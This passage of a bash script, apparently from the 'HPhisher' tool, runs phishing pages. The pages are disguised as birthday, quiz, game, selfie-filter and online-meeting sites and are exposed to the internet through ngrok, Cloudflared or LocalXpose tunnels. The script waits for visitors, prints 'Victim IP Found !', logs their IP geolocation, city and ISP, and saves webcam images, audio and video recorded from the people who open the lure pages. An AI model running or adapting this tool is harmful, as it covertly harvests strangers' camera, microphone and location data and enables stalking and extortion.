		echo -e "${GREEN} IP type: ${NC} $iptype"
	fi
	latitude=$(sed -n 's/"latitude"://p' track.txt)
	if [[ $latitude != "" ]]; then
		echo -e  "${GREEN} Latitude:  ${NC} $latitude"
	fi
	longitude=$(sed -n 's/"longitude"://p' track.txt)
	if [[ $longitude != "" ]]; then
		echo -e  "${GREEN} Longitude:  ${NC} $longitude"
	fi
	city=$(sed -n 's/"city"://p' track.txt)
	if [[ $city != "" ]]; then
		echo -e "${GREEN} City: ${NC} $city"
	fi
	isp=$(sed -n 's/"isp"://p' track.txt)
	if [[ $isp != "" ]]; then
		echo -e "${GREEN} Isp: ${NC} $isp"
	fi
	country=$(sed -n 's/"country"://p' track.txt)
	if [[ $country != "" ]]; then
		echo -e  "${GREEN} Country: ${NC} $country"
	fi
	flag=$(sed -n 's/"country_flag"://p' track.txt)
	if [[ $flag != "" ]]; then
		echo -e "${GREEN} Country flag: ${NC} $flag"
	fi
	cap=$(sed -n 's/"country_capital"://p' track.txt)
	if [[ $cap != "" ]]; then
		echo -e "${GREEN} Country capital: ${NC} $cap"
	fi
	phon=$(sed -n 's/"country_phone"://p' track.txt)
	if [[ $phon != "" ]]; then
		echo -e "${GREEN} Country code: ${NC} $phon"
	fi
	continent=$(sed -n 's/"continent"://p' track.txt)
	if [[ $continent != "" ]]; then
		echo -e  "${GREEN} Continent:  ${NC} $continent"
	fi
	ccode=$(sed -n 's/"currency_code"://p' track.txt)
	if [[ $ccode != "" ]]; then
		echo -e "${GREEN} Currency code: ${NC} $ccode"
	fi
	region=$(sed -n 's/"region"://p' track.txt)
	if [[ $region != "" ]]; then
		echo -e "${GREEN} State: ${NC} $region"
	fi
	cat track.txt >> "${log_name}.txt"
##	rm -rf track.txt
##	rm -rf rawtrack.txt
}

capture_data_image() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
  	while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                fi
                sleep 0.75
            	if [[ -e ".server/www/Log.log" ]]; then
			filename=$(date +%d-%m-%Y-%H-%M-%S)
	               	echo " "
		        printf "${GREEN} Cam file received! ${NC}"
			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
			echo -ne " "
                   	rm -rf .server/www/Log.log
			if [ -d ${logs_full_dir} ]; then
	               		mv .server/www/*.png  "${logs_full_dir}/image-${filename}.png"
			else
				mkdir ${logs_dir}
				mv ${logs_dir} ${files_dir}/${site_name}/
				mv .server/www/*.png "image-${filename}.png"
				mv "image-${filename}.png"  "${logs_full_dir}"
			fi
                fi
                sleep 0.5
	done
}

capture_data_audio() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	  while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                        rm -rf .server/www/ip.txt
                fi
                sleep 0.75
		if [[ -e ".server/www/Log.log" ]]; then
			filename=$(date +%d-%m-%Y-%H-%M-%S)
                        printf "${GREEN} Audio file received! ${NC}"
			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
			echo -ne " "
			rm -rf .server/www/Log.log
			if [ -d ${logs_full_dir} ]; then
                                mv .server/www/*.wav  "${logs_full_dir}/audio-${filename}.wav"
                        else
                                mkdir ${logs_dir}
                                mv ${logs_dir} ${files_dir}/${site_name}/
                                mv .server/www/*.wav "audio-${filename}.wav"
				mv "audio-${filename}.wav"  "${logs_full_dir}"
                        fi
                fi
                sleep 0.5
	done
}

capture_data_video() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                        rm -rf .server/www/ip.txt
                fi
                sleep 0.75
		if [[ -e ".server/www/Log.log" ]]; then
			filename=$(date +%d-%m-%Y-%H-%M-%S)
                        printf "${GREEN} Video file received! ${NC}"
			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
			echo -ne " "
                        rm -rf .server/www/Log.log
			if [ -d ${logs_full_dir} ]; then
                                mv .server/www/*.webm  "${logs_full_dir}/video-${filename}.webm"
                        else
                                mkdir ${logs_dir}
                                mv ${logs_dir} ${files_dir}/${site_name}/
				mv .server/www/*.webm "video-${filename}.webm"
                                mv "video-${filename}.webm"  "${logs_full_dir}"
                        fi
                fi
                sleep 0.5
	done
}

capture_data_video_audio() {
        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
                if [[ -e ".server/www/ip.txt" ]]; then
                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
                        capture_ip
                        rm -rf .server/www/ip.txt
                fi
                sleep 0.75
		if [[ -e ".server/www/Log.log" ]]; then
			filename=$(date +%d-%m-%Y-%H-%M-%S)
                        printf "${GREEN} Video and Audio file received! ${NC}"
			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
			echo -ne " "
                        rm -rf .server/www/Log.log
			if [ -d ${logs_full_dir} ]; then
                                mv .server/www/*.webm  "${logs_full_dir}/Video-${logs_dir}.webm"
                        else
                                mkdir ${logs_dir}
                                mv ${logs_dir} ${files_dir}/${site_name}/
                                mv .server/www/*.webm  "${logs_full_dir}/Video-${logs_dir}.webm"
                        fi
                fi
                sleep 0.5
	done
}

#online or offline stats
netstats="Offline"
check_netstats() {
	wget -q --spider http://api.github.com
	if [ $? -eq 0 ]; then
		netstats="Online"
	else
		netstats="Offline"
	fi
}

mainmenu() {
echo -e " "
echo -e " "
echo -e " "
banner
echo -e " "
echo -e " "
check_netstats
echo "${GREEN}Network Status = ${RED}$netstats"
echo -e " "
echo -e "${RED} CHOOSE A SITE : ${NC}"
echo -e " "
echo -e " "
echo -e "${BLUE} [1] ${GREEN} Image ${NC}"
echo -e "${BLUE} [2] ${GREEN} Audio ${NC}"
echo -e "${BLUE} [3] ${GREEN} Video ${NC}"
echo -e "${BLUE} [4] ${GREEN} Video & audio [BETA]${NC}"
echo -e " "
echo -e "${BLUE} [A] ${RED} About ${NC}"
echo -e "${BLUE} [B] ${RED} Request A site ${NC}"
echo -e "${BLUE} [C] ${RED} Report an Issue ${NC}"
echo -e "${BLUE} [D] ${RED} Check for Updates ${NC}"
echo -e "${BLUE} [00] ${RED} Exit ${NC}"
echo -e " "
read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher : ${BLUE}" reply_site
echo " "
case $reply_site in
    1 | 01)
		site_name="image"
	    site_image;;
    2 | 02)
		site_name="audio"
		site_audio;;
	3 | 03)
		site_name="video"
        site_video;;
	4 | 04)
		site_name="video_audio"
		site_video_audio;;
	A | a)
		xdg-open https://github.com/Alygnt/HPhisher
		{ sleep 2; clear; banner; mainmenu; };;
	B | b | C | c)
	  	xdg-open https://github.com/Alygnt/HPhisher/issues/new
		{ sleep 2; clear; banner; mainmenu; };;
	D | d)
		check_update;;
	0 | 00)
    		msg_exit;;
	*)
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; mainmenu; };;
esac
}

## Tunnel selection
tunnel_menu() {
clear
echo -e " "
echo -e " "
banner
echo -e " "
echo -e " "
echo -e "${RED}[${WHITE}-${RED}]${GREEN}Select a port forwarding service : ${BLUE}"
echo -e " "
echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]"
echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
echo -e "${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
echo -e " "
read -p " ${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/${site_template} : ${BLUE}" reply_tunnel

        case $reply_tunnel in
            1 | 01)
                start_localhost;;
            2 | 02)
				install_ngrok
				start_ngrok;;
            3 | 03)
				install_cloudflared
				start_cloudflared;;
           	4 | 04)
				install_loclx
				start_loclx;;
            *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; tunnel_menu; };;
        esac
}

site_image(){
clear
echo -e " "
echo -e " "
banner
echo -e " "
echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
echo -e " "
echo -e "${BLUE}[01]${CYAN} Default ${NC}"
echo -e "${BLUE}[02]${CYAN} Birthday ${NC}"
echo -e "${BLUE}[03]${CYAN} Book ${NC}"
echo -e "${BLUE}[04]${CYAN} Box Wish ${NC}"
echo -e "${BLUE}[05]${CYAN} Firework ${NC}"
echo -e "${BLUE}[06]${CYAN} Game ${NC}"
echo -e "${BLUE}[07]${CYAN} Guess ${NC}"
echo -e "${BLUE}[08]${CYAN} Quiz ${NC}"
echo -e "${BLUE}[09]${CYAN} RPS ${NC}"
echo -e "${BLUE}[10]${CYAN} Selfie ${NC}"
echo -e "${BLUE}[11]${CYAN} Spin Wheel ${NC}"
echo -e " "
read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
case $reply_template in
    1 | 01)
        site_template="default"
        tunnel_menu;;
	2 | 02)
	    site_template="birthday"
		tunnel_menu;;
	3 | 03)
		site_template="book"
		tunnel_menu;;
	4 | 04)
		site_template="boxwish"
		tunnel_menu;;
	5 | 05)
		site_template="firework"
		tunnel_menu;;
	6 | 06)
		site_template="game"
		tunnel_menu;;
	7 | 07)
		site_template="guess"
		tunnel_menu;;
	8 | 08)
		site_template="quiz"
		tunnel_menu;;
	9 | 09)
		site_template="rps"
		tunnel_menu;;
	10)
		site_template="selfie"
		tunnel_menu;;
	11)
		site_template="spinwheel"
		tunnel_menu;;
    *)
	    echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
        { sleep 1; banner; site_image; };;
esac
}

site_audio(){
clear
echo -e " "
echo -e " "
banner
echo -e " "
echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
echo -e " "
echo -e "${BLUE}[01]${CYAN} Default ${NC}"
echo -e " "
read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
case $reply_template in
        1 | 01)
            site_template="default"
            tunnel_menu;;
        *)
            echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
            { sleep 1; banner; site_audio; };;
esac
}

site_video(){
clear
echo -e " "
echo -e " "
banner
echo -e " "
echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
echo -e " "
echo -e "${BLUE}[01]${CYAN} Online meeting ${NC}"
echo -e "${BLUE}[02]${CYAN} Selfie Filter ${NC}"
echo -e " "
read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
case $reply_template in
	1 | 01)
		site_template="onlinemeet"
                tunnel_menu;;
	2 | 02)
		site_template="filter"
		tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_video; };;
esac
}

site_video_audio(){
clear
echo -e " "
echo -e " "
banner
echo -e " "
echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
echo -e " "
echo -e "${BLUE}[01]${CYAN} Online meeting ${NC}"
echo -e "${BLUE}[02]${CYAN} Selfie Filter ${NC}"
echo -e " "
read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
case $reply_template in
	1 | 01)
		site_template="onlinemeet"
                tunnel_menu;;
	2 | 02)
		site_template="filter"
		tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                { sleep 1; banner; site_video_audio; };;
esac
}

clear
cbanner
directories
kill_pid
dependencies
xpermission
clear
mainmenu
